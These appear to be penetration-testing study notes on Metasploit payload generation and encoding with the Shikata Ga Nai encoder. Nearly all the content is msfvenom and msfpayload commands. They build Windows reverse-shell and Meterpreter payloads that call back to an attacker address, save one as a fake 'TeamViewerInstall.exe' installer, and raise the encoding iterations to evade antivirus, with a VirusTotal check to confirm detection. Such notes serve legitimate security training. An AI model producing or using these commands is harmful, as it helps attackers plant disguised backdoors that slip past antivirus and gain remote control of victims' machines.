
- x64
- x86
- sparc
- ppc
- mips

SGN - Shikata Ga Nai
- Hard to detect after encoded

Payload generation before 2015:
```shell-session
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

Payload generation after 2015 (msfvenom) WITHOUT ENCODING:
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

Payload generation WITH ENCODING:
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```


```shell-session
set payload 15
```
```shell-session
show encoders
```


This will get detected by AV due to 1 iteration of encoding:
```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

More iteration = harder to detect:
```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```


VirusTotal API with metasploit:
```shell-session
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

